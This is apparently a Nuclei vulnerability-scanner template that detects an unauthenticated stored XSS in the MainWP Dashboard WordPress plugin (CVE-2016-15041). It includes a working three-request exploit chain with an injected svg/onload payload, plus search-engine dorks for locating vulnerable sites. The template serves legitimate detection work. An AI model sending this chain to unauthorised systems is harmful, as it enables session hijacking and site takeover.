id: CVE-2016-15041

info:
  name: MainWP Dashboard <= 3.1.2 - Unauthenticated Stored XSS
  author: nuclei-templates
  severity: high
  description: |
    MainWP Dashboard plugin for WordPress versions up to 3.1.2 contains a stored
    cross-site scripting vulnerability in the mwp_setup_purchase_username parameter
    due to insufficient input sanitization and output escaping, allowing
    unauthenticated attackers to inject malicious scripts.
  impact: |
    Successful exploitation allows unauthenticated attackers to inject malicious
    JavaScript that executes when administrators access the MainWP Extensions
    settings panel, potentially leading to session hijacking, credential theft,
    or administrative actions on managed WordPress sites.
  remediation: |
    Update MainWP Dashboard to version 3.1.3 or later which properly sanitizes
    user input in the mwp_setup_purchase_username parameter.
  reference:
    - https://klikki.fi/adv/mainwp.html
    - https://nvd.nist.gov/vuln/detail/CVE-2016-15041
    - https://www.wordfence.com/blog/2016/02/mainwp-dashboard-vulnerability/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2016-15041
    cwe-id: CWE-79
    epss-score: 0.67231
    epss-percentile: 0.98412
    cpe: cpe:2.3:a:mainwp:mainwp_dashboard:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: mainwp
    product: mainwp_dashboard
    framework: wordpress
    shodan-query: http.component:"wordpress" && vuln:CVE-2016-15041
    fofa-query: "/wp-content/plugins/mainwp/"
    google-query: inurl:"/wp-admin/admin-post.php?page=mainwp-setup"
  tags: cve,cve2016,wordpress,mainwp,xss,stored-xss,unauth,kev,vuln

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /wp-admin/admin-post.php?page=mainwp-setup&step=installation HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
        condition: and

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '_wpnonce=([a-f0-9]+)'
          - '_wpnonce" value="([a-f0-9]+)"'
          - 'name="_wpnonce" value="([a-f0-9]+)"'
        name: nonce
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension&_wpnonce={{nonce}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        mwp_setup_purchase_username=testnuclei"><svg/onload=alert(1)>&mwp_setup_purchase_passwd=test&save_step=1

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(header, "Location: ?page=mainwp-setup")'
        condition: and

  - raw:
      - |
        GET /wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "testnuclei\"><svg/onload=alert(1)>")'
        condition: and
